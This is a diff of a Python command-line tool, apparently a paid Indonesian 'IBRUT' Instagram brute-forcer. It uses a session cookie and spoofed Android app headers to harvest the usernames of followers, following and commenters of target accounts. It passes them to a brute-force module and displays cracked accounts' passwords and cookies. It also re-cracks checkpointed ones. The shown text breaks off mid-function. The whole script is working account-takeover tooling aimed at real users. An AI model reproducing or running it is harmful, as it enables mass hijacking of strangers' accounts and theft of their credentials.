@@ -1,10 +1,28 @@
 #!/usr/bin/env python
 # coding: utf-8
 # source: https://github.com/khamdihi-dev/Prem
+# Beli di authornya langsung agar tidak tertipu! | "Buy directly from the author to avoid being scammed!"
 
-import requests, platform, os, re, time, sys, json
-from method import Brute as Bdt_old
+# facebook : https://web.facebook.com/dWxmYWgu
+# whatsapp : 083853140469
+
+import os, re, sys, questionary, requests, uuid, time, random, base64, json
+
+from method import Brute
+from lang import language
 from method import ApiKey
+
+bahasa = []
+dumpdata = []
+
+_lang = questionary.select("Pilih Bahasa | Select Language:",choices=["Indonesia", "English"]).ask().lower()
+if(_lang == 'english'): bahasa.append('en')
+else: bahasa.append('id')
+
+version = sys.version.split(' ')[0][:4]
+if version != '3.12':
+    print(language.languages(bahasa[0]).get_python_update_instructions()['header'])
+    exit()
 
 A = "\033[90m"   # Abu-abu
 B = "\033[94m"   # Biru
@@ -33,286 +51,551 @@ X = "\033[90m"   # Abu-abu Tua
 Y = "\033[93m"   # Kuning
 Z = "\033[33m"   # Kuning Gelap (Gold)
 
-RESET = "\033[0m"
+def clear():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print('Instagram IBRUT 18.0\n')
 
 
-xx, un = 0, []
+class config:
+    def __init__(self):
+        self.ulsd = language.languages(bahasa[0])
 
-class MAIN:
+    def pigeon(self):
+        return f'UFS-{uuid.uuid4()}-0'
 
-   bersih = lambda xyz, plt: os.system('clear' if plt.lower() == 'linux' else 'cls')
-   userid = []
-   pk_idg = []
+    def clintime(self):
+        return str(time.time())[:14]
+    
+    def deviceid(self):
+        return str(uuid.uuid4())
+    
+    def family(self):
+        return str(uuid.uuid4())
 
-   def __init__(self):
-       try:self.bersih(platform.system())
-       except:pass
-       super(MAIN).__init__()
+    def androidid(self):
+        return f'android-{str(uuid.uuid1().hex)[:16]}'
+    
+    def idbear(self, cokie):
+        try:
+            self.id = re.search(r'ds_user_id=(\d+);',str(cokie)).group(1)
+            self.sn = re.search(r'sessionid=(.*?);',str(cokie)).group(1)
+            self.br = base64.b64encode(json.dumps({'ds_user_id': self.id, 'sessionid': self.sn}).encode()).decode()
+            return self.id, self.br
+        except AttributeError:
+            print(self.ulsd.Error_lang()['header'])
+            sys.exit()
 
-   def Me(self):
-       print(r''' %s_____  _____  _____  _____
-/  ___>/     \/  _  \|  _  \  %screate by
-|___  ||  |--||  _  <|  |  |  %skhamdihi dev%s
-<_____/\_____/\_____/|_____/  %ssimpel bruteforce %sv16.3%s
+class Login:
+    def __init__(self):
+        self.ulsd = language.languages(bahasa[0])
 
-[%s*%s] Source : %shttps://github.com/khamdihi-dev/Prem.git%s
-       '''%(P,P,H,P,P,H,P,H,P,H,P))
+    def putcokie(self):
+        print('\n'+self.ulsd.login_lang()['header'])
+        self.cokie = input('cookie : ')
+        self.sign = self.chekcokie(self.cokie)
+        if self.sign == True:
+            exit('Login succes')
+        else:
+            exit('Login failed')
 
-   def find_res(self, meki=[]):
-       try:
-           self.file = os.listdir('data')
-           print('\n [ Pilih File Anda ]\n')
-           for self.su in self.file:
-               if 'ok' not in self.su.lower() or 'cp' in self.su.lower():pass
-               else: print('%s[%s+%s] %s'%(P,H,P,self.su))
-           self.name = input('\n[%s!%s] Masukan nama file : '%(H,P))
-       except Exception as e:exit(e)
-       for a in open(f'data/{self.name}','r').read().splitlines():
-           xyz = re.findall('ds_user_id=(.*)',str(a))
-           if len(xyz) == 0:continue
-           else:
-                if xyz not in meki:meki.append('ds_user_id=%s'%(xyz[0]))
-       if len(meki) == 0:
-          exit(f'\n{P}[{M}!{P}] Tidak Bisa menemukan cokie!')
-       else:
-          for memek in meki:
-              try:
-                  print(f'\n{P}[{J}!{P}] Mencoba: {H}{memek}')
-                  xyz = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
-                  uid = re.search('ds_user_id=(\d+)', str(memek)).group(1)
-                  req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies={'cookie':memek}).json()['user']['full_name']
-                  open('data/IG-login.txt','w').write(f'{memek}')
-                  print(f'\n{P}[{J}!{P}] Login sebagai : {req}')
-                  time.sleep(2)
-                  try:self.bersih(platform.system())
-                  except:pass
-                  self.insta()
-              except Exception as e:
-                  print(f'\n{P}{J}!{P}] Expired: J{memek}')
-
-   def aset_ig(self, back=False):
-       try:self.bersih(platform.system())
-       except:pass
-       if os.path.isfile('data/IG-login.txt') is True:
-           self.coki = {'cookie':open('data/IG-login.txt','r').read()}
-       else:
-           self.momo = {'cookie':input('[ Login instagram ]\n\n[?] Masukan cookie : ')}
-           if self.momo['cookie'] == 'res':
-              self.coki = {'cookie':self.find_res()}
-           else:self.coki = self.momo
-       try:
-           xyz = {'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3'}
-           cek = requests.get('https://www.instagram.com/api/v1/tags/web_info/?tag_name=khmd', headers=xyz,  cookies=self.coki).json()
-           uid = re.search('ds_user_id=(\d+)', str(self.coki['cookie'])).group(1)
-           req = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=xyz, cookies=self.coki).json()['user']
-           open('data/IG-login.txt','w').write(f'{self.coki["cookie"]}')
-       except:
-           os.system('rm -rf data/IG-login.txt')
-           print('\n[!] Invalid cookie');self.aset_ig()
-       try:self.bersih(platform.system())
-       except:pass
-       if back:return self.coki, req['full_name'], req['follower_count']
-       else:exit(os.system(f'python3 {sys.argv[0]}'))
-
-   def insta(self):
-       try:self.bersih(platform.system())
-       except:pass
-       self.aset,self.nama,self.fol = self.aset_ig(True)
-       self.Me()
-       print(f' {P}• {H}Users Information{P}\n')
-       ApiKey.UserKey().konfirkeys()
-       print(f'''
-[{H}>{P}] Nama      : {H}{self.nama}{P}
-[{H}>{P}] Followers : {H}{self.fol}
-
-{P}[{J}1{P}] Dump Followers
-{P}[{J}2{P}] Dump Following 
-{P}[{J}3{P}] Chek Checkpoin
-{P}[{J}4{P}] Dump Komentar
-{P}[{J}5{P}] Chek Hasil
-{P}[{J}0{P}] Logout\n''')
-
-       self.chs(self.aset)
-
-   def chs(self, assets):
-       while True:
-         x = input(f'[{H}?{P}] Pilih : ')
-         if x in   ['01','1']:self.dumps(assets, True)
-         elif x in ['02','2']:self.dumps(assets, False)
-         elif x in ['03','3']:self.Ulang()
-         elif x in ['04','4']:self.komentar(assets)
-         elif x in ['05','5']:self.igrst()
-         elif x in ['0']:exit(os.system('rm -rf data/IG-login.txt'))
-
-
-
-   def komentar(self, cokie, dav=[]):
-       print(f'\n[{H}?{P}] Masukan link postingan atau reels. pisahkan dengan koma')
-       link = input(f'[{H}?{P}] Link post : ').split(',')
-       try:
-           for ling in link:
-               self.r = requests.get(ling, cookies=cokie).text
-               self.o = re.search('"media_id":"(\d+)"', str(self.r)).group(1)
-               dav.append(self.o)
-           for self.x in dav:
-               self.dump_komen(cokie, self.x, '')
-       except:pass
-       self.ToolsType()
-
-   def dump_komen(self, cokie, uid, min):
-       global xx
-       try:
-            self.r = requests.get(f"https://i.instagram.com/api/v1/media/{uid}/comments/?can_support_threading=true&permalink_enabled=false&min_id={min}", cookies = cokie, headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',}).json()
-            for self.i in self.r['comments']:
-                self.a = self.i['user']['username'] +'|'+ self.i['user']['full_name']
-                if self.a not in self.pk_idg:
-                   self.pk_idg.append(self.a)
-                   xx +=1
-                   print(f'\r[+] Berhasil dump {xx}',end=' ')
-            if 'next_min_id' in str(self.r):
-                self.dump_komen(cokie, uid, self.r['next_min_id'])
-       except:pass
-
-   def igrst(self):
-       print('')
-       print(f'[{H}1{P}] Akun OK')
-       print(f'[{H}2{P}] Akun CP')
-       print(f'[{H}3{P}] Kembali\n')
-       while True:
-         x = input(f'[{H}?{P}] Pilih : ')
-         if x in   ['01','1']:
+    def chekcokie(self, cokie):
+        self.cokie = cokie
+        if 'mid=' in str(self.cokie): self.mid = re.search('mid=(.*?);',str(self.cokie)).group(1)
+        else: self.mid = ''
+        with requests.Session() as self.r:
             try:
-                self.file = os.listdir('data')
-                print('\n [ Pilih File Anda ]\n')
-                for self.su in self.file:
-                   if 'ok' not in self.su.lower() or 'cp' in self.su.lower():pass
-                   else: print('%s[%s+%s] %s'%(P,H,P,self.su))
-                self.name = input('\n[%s!%s] Masukan nama file : '%(H,P))
-            except Exception as e:exit(e)
-            for a in open(f'data/{self.name}','r').read().splitlines():
-                try:
-                    dumx = json.loads(a)
-                    print(f'''
-{P}[{J}*{P}] username : {dumx['username']}
-{P}[{J}*{P}] fullname : {dumx['nama']}
-{P}[{J}*{P}] password : {dumx['password']}
-{P}[{J}*{P}] follower : {dumx['followers']}
-{P}[{J}*{P}] folowing : {dumx['following']}
-{P}[{J}*{P}] email    : {dumx['email']}
-{P}[{J}*{P}] nomor    : {dumx['nomor']}
-{P}[{J}*{P}] birthday : {dumx['birthday']}
-{P}[{J}*{P}] cookies  : {dumx['cookie']}
-''')
-                except Exception as e:
-                    print(e)
-            exit()
-         elif x in ['02','2']:
+                self.insta = config()
+                self.uid, self.bearer = self.insta.idbear(self.cokie)
+                self.r.headers.update({
+                    'x-ig-app-locale': 'in_ID',
+                    'x-ig-device-locale': 'in_ID',
+                    'x-ig-mapped-locale': 'id_ID',
+                    'x-pigeon-session-id': self.insta.pigeon(),
+                    'x-pigeon-rawclienttime': self.insta.clintime(),
+                    'x-ig-bandwidth-speed-kbps': str(round(random.uniform(1000, 10000), 3)),
+                    'x-ig-bandwidth-totalbytes-b': str(random.randint(1000000, 10000000)),
+                    'x-ig-bandwidth-totaltime-ms': str(random.randint(1000, 10000)),
+                    'x-bloks-version-id': 'ee55d61628b17424a72248a17431be7303200a6e7fa08b0de1736f393f1017bd',
+                    'x-ig-www-claim': '0',
+                    'x-debug-www-claim-source': 'handleLogin3',
+                    'x-bloks-prism-button-version': 'CONTROL',
+                    'x-bloks-prism-colors-enabled': 'false',
+                    'x-bloks-prism-ax-base-colors-enabled': 'false',
+                    'x-bloks-prism-font-enabled': 'false',
+                    'x-bloks-is-layout-rtl': 'false',
+                    'x-ig-device-id': self.insta.deviceid(),
+                    'x-ig-family-device-id': self.insta.family(),
+                    'x-ig-android-id': self.insta.androidid(),
+                    'x-ig-timezone-offset': str(-time.timezone),
+                    'x-ig-nav-chain': f'MainFeedFragment:feed_timeline:1:cold_start:{int(time.time())}.853::,com.bloks.www.bloks.ig.ndx.ci.entry.screen:com.bloks.www.bloks.ig.ndx.ci.entry.screen:2:button:{int(time.time())}.356::',
+                    'x-fb-connection-type': 'WIFI',
+                    'x-ig-connection-type': 'WIFI',
+                    'x-ig-capabilities': '3brTv10=',
+                    'x-ig-app-id': '567067343352427',
+                    'priority': 'u=3',
+                    'user-agent': 'Instagram 360.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977)',
+                    'accept-language': 'id-ID, en-US',
+                    'authorization': f'Bearer IGT:2:{self.bearer}',
+                    'x-mid': self.mid,
+                    'ig-u-ds-user-id': self.uid,
+                    'ig-intended-user-id': self.uid,
+                    'x-fb-http-engine': 'Liger',
+                    'x-fb-client-ip': 'True',
+                    'x-fb-server-cluster': 'True',
+                })
+                self.p = self.r.get(f'https://i.instagram.com/api/v1/users/{self.uid}/info/').json()['user']['full_name']
+                open('data/login.txt','w').write(cokie)
+                return True
+            except:return False
+    
+    def find_result(self):
+
+        def convert(bearer):
             try:
-                self.file = os.listdir('data')
-                print('\n [ Pilih File Anda ]\n')
-                for self.su in self.file:
-                   if 'CP' in self.su:print('%s[%s+%s] %s'%(P,H,P,self.su))
-                self.name = input('\n[%s!%s] Masukan nama file : '%(H,P))
-            except Exception as e:exit(e)
-            for a in open(f'data/{self.name}','r').read().splitlines():
+                coks = json.loads(base64.b64decode(bearer.split(':')[2]).decode())
+                cokz = ';'.join(['%s=%s'%(name, value) for name,value in coks.items()])
+                return cokz
+            except Exception as e:
+                print('failed decode bearer', e)
+        try:
+            self.file = os.listdir('data')
+            self.copy = []
+            print('')
+            for self.y in self.file:
+                if 'OK' in self.y: self.copy.append('data/'+self.y)
+            _file = questionary.select(self.ulsd.select_file()['header'],choices=self.copy).ask()
+            for self.ceks in open(_file,'r').read().splitlines():
                 try:
-                    dumx = json.loads(a)
-                    print(f'''
-{P}[{D}*{P}] username : {dumx['username']}
-{P}[{D}*{P}] password : {dumx['password']}
-{P}[{D}*{P}] follower : {dumx['followers']}
-{P}[{D}*{P}] folowing : {dumx['following']}
-{P}[{D}*{P}] feedpost : {dumx['postingan']}
-''')
-                except Exception as e:
-                    print(e)
+                    self.cokie = convert(json.loads(self.ceks)['cookie'])
+                    self.sign = self.chekcokie(self.cokie+';')
+                    if(self.sign == True): 
+                        print('\nsuccess :',self.cokie)
+                        exit()
+                    else:print('\nfailed :',self.cokie)
+                except:continue
             exit()
+        except FileNotFoundError:
+            print(self.ulsd.Error_lang()['header'])
+            exit()
+    
+    def Loginwith(self):
+        _ask = questionary.select(self.ulsd.login_lang()['header'],choices=self.ulsd.login_withs()['header']).ask()
+        if 'cookie' in str(_ask):self.putcokie()
+        else:self.find_result()
 
-         elif x in ['03','3']:self.insta()
+class infone:
+    
+    def __init__(self):
+        self.cokie = open('data/login.txt','r').read()
 
-   def Ulang(self):
-       try:
-          dirs = os.listdir('data')
-          if len(dirs) == 0:exit(f'\n{P}[{M}!{P}] File Tidak Ada')
-          print('')
-          for angka,asu in enumerate(dirs, start=1):
-              if 'CP' not in str(asu):pass
-              else:print(f' {P}[{J}*{P}] {asu}')
-          print(f'\n[{H}!{P}] Masukan Nama file. Jangan Angkanya')
-          file = input(f'[{H}?{P}] Nama file : ')
-          for rest in open(f'data/{file}','r').read().splitlines():
-              try:
-                  dumx = json.loads(rest)
-                  uid, pas = dumx['username'], dumx['password']
-                  self.pk_idg.append(f'{uid}|{pas}')
-                  print(f'\r[+] Berhasil dump {len(self.pk_idg)}',end=' ')
-              except Exception as e:
-                  print(e)
-       except (FileNotFoundError,ValueError):
-          exit('\n[!] File Tidak Ada Atau Pemisahan Salah.')
-       self.ToolsType()
+    def profile(self):
+        if 'mid=' in str(self.cokie): self.mid = re.search('mid=(.*?);',str(self.cokie)).group(1)
+        else: self.mid = ''
+        with requests.Session() as self.r:
+            try:
+                self.insta = config()
+                self.uid, self.bearer = self.insta.idbear(self.cokie)
+                self.r.headers.update({
+                    'x-ig-app-locale': 'in_ID',
+                    'x-ig-device-locale': 'in_ID',
+                    'x-ig-mapped-locale': 'id_ID',
+                    'x-pigeon-session-id': self.insta.pigeon(),
+                    'x-pigeon-rawclienttime': self.insta.clintime(),
+                    'x-ig-bandwidth-speed-kbps': str(round(random.uniform(1000, 10000), 3)),
+                    'x-ig-bandwidth-totalbytes-b': str(random.randint(1000000, 10000000)),
+                    'x-ig-bandwidth-totaltime-ms': str(random.randint(1000, 10000)),
+                    'x-bloks-version-id': 'ee55d61628b17424a72248a17431be7303200a6e7fa08b0de1736f393f1017bd',
+                    'x-ig-www-claim': '0',
+                    'x-debug-www-claim-source': 'handleLogin3',
+                    'x-bloks-prism-button-version': 'CONTROL',
+                    'x-bloks-prism-colors-enabled': 'false',
+                    'x-bloks-prism-ax-base-colors-enabled': 'false',
+                    'x-bloks-prism-font-enabled': 'false',
+                    'x-bloks-is-layout-rtl': 'false',
+                    'x-ig-device-id': self.insta.deviceid(),
+                    'x-ig-family-device-id': self.insta.family(),
+                    'x-ig-android-id': self.insta.androidid(),
+                    'x-ig-timezone-offset': str(-time.timezone),
+                    'x-ig-nav-chain': f'MainFeedFragment:feed_timeline:1:cold_start:{int(time.time())}.853::,com.bloks.www.bloks.ig.ndx.ci.entry.screen:com.bloks.www.bloks.ig.ndx.ci.entry.screen:2:button:{int(time.time())}.356::',
+                    'x-fb-connection-type': 'WIFI',
+                    'x-ig-connection-type': 'WIFI',
+                    'x-ig-capabilities': '3brTv10=',
+                    'x-ig-app-id': '567067343352427',
+                    'priority': 'u=3',
+                    'user-agent': 'Instagram 360.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977)',
+                    'accept-language': 'id-ID, en-US',
+                    'authorization': f'Bearer IGT:2:{self.bearer}',
+                    'x-mid': self.mid,
+                    'ig-u-ds-user-id': self.uid,
+                    'ig-intended-user-id': self.uid,
+                    'x-fb-http-engine': 'Liger',
+                    'x-fb-client-ip': 'True',
+                    'x-fb-server-cluster': 'True',
+                })
+                self.p = self.r.get(f'https://i.instagram.com/api/v1/users/{self.uid}/info/').json()['user']
+                self.username = self.p['username']
+                self.fullname = self.p['full_name']
+                self.follower = self.p['follower_count']
+                self.following = self.p['following_count']
+                self.postingan = self.p['media_count']
+                return self.username, self.fullname, self.follower, self.following,self.postingan
 
-   def dumps(self, cintil, typess, xyz = []):
-       if 'csrftoken' not in str(cintil['cookie']):
-          try:
-              self.memek = requests.get('https://www.instagram.com/data/shared_data/', cookies = cintil).json()
-              self.token = self.memek['config']['csrf_token']
-              cintil['cookie'] +=';csrftoken=%s;'%(self.token)
-          except Exception as e:
-              os.system('rm -rf data/IG-login.txt')
-              exit(f'\n{P}{J}!{P}] Csrftoken tidak tersedia, dump tidak akan berjalan: {e}')
-       print(f'\n[{H}?{P}] Masukan username akun instagram. Pisahkan Dengan Koma')
-       users = input(f'[{H}?{P}] Username : ').split(',')
-       try:
-           for self.y in users:
-               req = requests.get(f'https://www.instagram.com/{self.y}/', cookies = cintil).text
-               uid = re.search('"user_id":"(\d+)"', str(req)).group(1)
-               if uid not in xyz:xyz.append(uid)
-       except:pass
-       try:
-           for kintil in xyz:
-               if typess is True:
-                  self.Graphql(True, kintil, cintil['cookie'], '')
-               else:
-                  self.Graphql(False, kintil, cintil['cookie'], '')
-       except:pass
-       self.ToolsType()
+            except Exception as e:print(e)
+class menu:
+    def __init__(self):
+        self.ulsd = language.languages(bahasa[0])
+        self.uid_user = []
+        self.uid_link = []
 
-   def Graphql(self, typess, userid, cokie,after):
-       global xx
-       self.api = "https://www.instagram.com/graphql/query/"
-       self.csr = 'variables={"id":"%s","first":200,"after":"%s"}'%(userid,after)
-       self.mek = "query_hash=d04b0a864b4b54837c0d870b0e77e076&{}".format(self.csr) if typess is False else "query_hash=c76146de99bb02f6415203be841dd25a&{}".format(self.csr)
-       try:
-           self.ptk = {"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","cookie": cokie}
-           self.req = requests.get(self.api, params=self.mek, headers=self.ptk).json()
-           if 'require_login' in self.req:
-               if len(self.pk_idg) > 0:
-                  pass
-               else:
-                  exit(f'\n{P}[{J}!{P}] Invalid Cookie')
-           self.khm = 'edge_followed_by' if typess is True else 'edge_follow'
-           for self.xyz in self.req['data']['user'][self.khm]['edges']:
-               self.xy = self.xyz['node']['username'] + '|' + self.xyz['node']['full_name']
-               if self.xy not in self.pk_idg:
-                  xx +=1
-                  self.pk_idg.append(self.xy)
-                  print(f'\r{P}[{J}+{P}] Berhasil dump {H}{xx} {P}id J{userid}',end=' ')
-           self.end = self.req['data']['user'][self.khm]['page_info']['has_next_page']
-           if self.end is True:
-               self.after = self.req['data']['user'][self.khm]['page_info']['end_cursor']
-               self.Graphql(typess, userid, cokie, self.after)
-           else:pass
-       except:pass
+    def clear1(self):
+        if os.path.isfile('data/login.txt'):
+            self.cokz = open('data/login.txt','r').read()
+            self.ceks = Login().chekcokie(self.cokz)
+            if self.ceks is False:
+                Login().Loginwith()
+            return
+        else:
+            Login().Loginwith()
 
-   def ToolsType(self):
-       exit(Bdt_old.MAIN().List(self.pk_idg))
 
-def ListTools():
-    try:MAIN().bersih(platform.system())
-    except:pass
-    MAIN().insta()
+    def instagram(self):
+        clear()
+        self.clear1()
+        if os.path.isfile('data/.keys.txt') is False:ApiKey.UserKey().BuyLicen()
+        else:ApiKey.UserKey().konfirkeys()
+        self.dihi = self.ulsd.menu_list()['header']
+        self.sdyh = questionary.select(self.ulsd.menu_list()['message'],choices=self.ulsd.menu_list()['header']).ask()
+        if self.sdyh == self.dihi[0]:self.userinfo()
+        elif self.sdyh == self.dihi[1]:self.followers()
+        elif self.sdyh == self.dihi[2]:self.following()
+        elif self.sdyh == self.dihi[3]:self.komentar()
+        elif self.sdyh == self.dihi[4]:self.hasil()
+        elif self.sdyh == self.dihi[5]:self.crackulang()
+        elif self.sdyh == self.dihi[6]:exit('\nGood bye')
 
-if __name__:
-    os.system('git pull')
-    ListTools()
+    def userinfo(self):
+        if os.path.isfile('data/.keys.txt') is False:ApiKey.UserKey().konfirkeys()
+        if os.path.isfile('data/login.txt') is False:Login().Loginwith()
+        self.ingf = self.ulsd.userandkeyinfo()
+        self.keys = open('data/.info.txt','r').read()
+        self.info = self.ingf['name']['headers']
+        self.username, self.fullname, self.follower, self.following, self.postingan = infone().profile()
+        self.info.update({
+            'username': self.keys.split('|')[1],
+            'bergabung': open('data/.join.txt','r').read(),
+            'kadarluarsa': self.keys.split('|')[2],
+            'licensi': self.keys.split('|')[0],
+            'instagram username': self.username,
+            'instagram fullname': self.fullname,
+            'instagram follower': self.follower,
+            'instagram following': self.following,
+            'instagram postingan': self.postingan,
+            'instagram cookies': open('data/login.txt','r').read()
+        })
+        if self.ingf['lang'] == 'en':
+            print(f'''
+
+username key       : {self.username}
+joined             : {self.info['bergabung']}
+expiration         : {self.info['kadarluarsa']}
+license            : {self.info['licensi']}
+
+instagram username : {self.info['instagram username']}
+instagram fullname : {self.info['instagram fullname']}
+instagram followers: {self.info['instagram follower']}
+instagram following: {self.info['instagram following']}
+instagram posts    : {self.info['instagram postingan']}
+instagram cookies  : {self.info['instagram cookies']}
+
+            ''')
+            sys.exit()
+        print(f'''
+
+username key : {self.username}
+bergabung    : {self.info['bergabung']}
+kadarluarsa  : {self.info['kadarluarsa']}
+license      : {self.info['licensi']}
+
+instagram username  : {self.info['instagram username']}
+instagram fullname  : {self.info['instagram fullname']}
+instagram followrs  : {self.info['instagram follower']}
+instagram following : {self.info['instagram following']}
+instagram postingan : {self.info['instagram postingan']}
+instagram cookies   : {self.info['instagram cookies']}
+        ''')
+        sys.exit()
+    
+    def followers(self):
+        print(f'\n{self.ulsd.dumpflfw()["message"]}')
+        self.username = input(self.ulsd.dumpflfw()["input"]).split(',')
+        for self.uname in self.username:
+            self.uid = convert().usernametoid(self.uname)
+            if(self.uid): self.uid_user.append(self.uid)
+        if len(self.uid_user) == 0: exit('\nuserid not found')
+        for self.userid in self.uid_user:
+            dump().followers(self.userid, '')
+        Brute.MAIN(dumpdata, bahasa[0]).Run()
+
+    def following(self):
+        print(f'\n{self.ulsd.dumpflfw()["message"]}')
+        self.username = input(self.ulsd.dumpflfw()["input"]).split(',')
+        for self.uname in self.username:
+            self.uid = convert().usernametoid(self.uname)
+            if(self.uid): self.uid_user.append(self.uid)
+        if len(self.uid_user) == 0: exit('\nuserid not found')
+        for self.userid in self.uid_user:
+            dump().following(self.userid, '')
+        Brute.MAIN(dumpdata, bahasa[0]).Run()
+
+    def komentar(self):
+        print(f'\n{self.ulsd.komentar()["message"]}')
+        self.tautan = input(self.ulsd.komentar()["input"])
+        self.getmid = convert().media_id(self.tautan)
+        if self.getmid == None: return self.instagram()
+        dump().komentar(self.getmid,'')
+        Brute.MAIN(dumpdata, bahasa[0]).Run()
+
+    def hasil(self):
+        self.listfile = []
+        self.lst = self.ulsd.chekhasil()['header']
+        self.usr = questionary.select(self.ulsd.chekhasil()['message'],choices=self.lst).ask()
+        if self.usr == self.lst[0]:
+            try:
+                self.dirs = os.listdir('data')
+                for self.alls in self.dirs:
+                    if 'OK' not in self.alls:
+                        continue
+                    if self.alls not in self.listfile:self.listfile.append(self.alls)
+                    self.file = questionary.select(self.ulsd.chekhasil()['message1'], choices=self.listfile).ask()
+                    for self.xyz in open(f'data/{self.file}','r').read().splitlines():
+                        try:
+                            self.parse = json.loads(self.xyz)
+                            print(f'''
+username  : {self.parse['username']}
+password  : {self.parse['password']}
+followers : {self.parse['followers']}
+following : {self.parse['following']}
+cookies   : {self.parse['cookie']}
+                            ''')
+                        except:pass
+                    sys.exit()
+            except Exception as e:
+                print(self.ulsd.Error_lang()['header'])
+                exit(e)
+        else:
+            try:
+                self.dirs = os.listdir('data')
+                for self.alls in self.dirs:
+                    if 'CP' not in self.alls:
+                        continue
+                    if self.alls not in self.listfile:self.listfile.append(self.alls)
+                    self.file = questionary.select(self.ulsd.chekhasil()['message1'], choices=self.listfile).ask()
+                    for self.xyz in open(f'data/{self.file}','r').read().splitlines():
+                        try:
+                            self.parse = json.loads(self.xyz)
+                            print(f'''
+username  : {self.parse['username']}
+password  : {self.parse['password']}
+followers : {self.parse['followers']}
+following : {self.parse['following']}
+''')
+                        except:pass
+                    sys.exit()
+            except Exception as e:
+                print(self.ulsd.Error_lang()['header'])
+                exit(e)
+    
+    def crackulang(self):
+        try:
+            self.listfile = []
+            self.dirs = os.listdir('data')
+            for self.alls in self.dirs:
+                if 'CP' not in self.alls:
+                    continue
+                if self.alls not in self.listfile:self.listfile.append(self.alls)
+                self.file = questionary.select(self.ulsd.chekhasil()['message1'], choices=self.listfile).ask()
+                for self.xyz in open(f'data/{self.file}','r').read().splitlines():
+                    try:
+                        self.parse = json.loads(self.xyz)
+                        self.username, self.passworrd = self.parse['username'], self.parse['password']
+                        dumpdata.append(f'{self.username}|{self.passworrd}')
+                    except:pass
+                break
+            Brute.MAIN(dumpdata, bahasa[0]).Run()
+        except Exception as e:
+            print(self.ulsd.Error_lang()['header'])
+            exit(e)
+
+
+class convert:
+    def __init__(self):
+        self.cokie = open('data/login.txt','r').read()
+
+    def usernametoid(self, username):
+        with requests.Session() as self.r:
+            try:
+                self.r.headers.update({
+                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
+                    'cache-control': 'max-age=0',
+                    'cookie': self.cokie,
+                    'dpr': '1',
+                    'priority': 'u=0, i',
+                    'sec-ch-prefers-color-scheme': 'dark',
+                    'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-model': '""',
+                    'sec-ch-ua-platform': '"Windows"',
+                    'sec-ch-ua-platform-version': '"15.0.0"',
+                    'sec-fetch-dest': 'document',
+                    'sec-fetch-mode': 'navigate',
+                    'sec-fetch-site': 'none',
+                    'sec-fetch-user': '?1',
+                    'upgrade-insecure-requests': '1',
+                    'user-agent': 'Instagram 360.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977)',
+                    'viewport-width': '673'
+                })
+                self.req = self.r.get(f"https://www.instagram.com/api/v1/users/web_profile_info/?username={username}").json()['data']['user']['id']
+                return self.req
+            except:return None
+    
+    def media_id(self, posts_url):
+        with requests.Session() as self.r:
+            try:
+                self.r.headers.update({
+                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
+                    'cache-control': 'max-age=0',
+                    'cookie': self.cokie,
+                    'dpr': '1',
+                    'priority': 'u=0, i',
+                    'sec-ch-prefers-color-scheme': 'dark',
+                    'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
+                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.99", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"',
+                    'sec-ch-ua-mobile': '?0',
+                    'sec-ch-ua-model': '""',
+                    'sec-ch-ua-platform': '"Windows"',
+                    'sec-ch-ua-platform-version': '"15.0.0"',
+                    'sec-fetch-dest': 'document',
+                    'sec-fetch-mode': 'navigate',
+                    'sec-fetch-site': 'none',
+                    'sec-fetch-user': '?1',
+                    'upgrade-insecure-requests': '1',
+                    'user-agent': 'Instagram 360.0.0.52.192 Android (28/9; 239dpi; 720x1280; google; G011A; G011A; intel; in_ID; 672535977)',
+                    'viewport-width': '673'
+                })
+                self.req = self.r.get(posts_url).text
+                self.mid = re.search(r'"media_id":"(\d+)"',str(self.req)).group(1)
+                return self.mid
+            except AttributeError:return None
+
+class dump:
+    def __init__(self):
+        self.cokie = open('data/login.txt','r').read()
+
+    def followers(self,userid,next_pae):
+        with requests.Session() as self.r:
+            try:
+                self.r.headers.update({
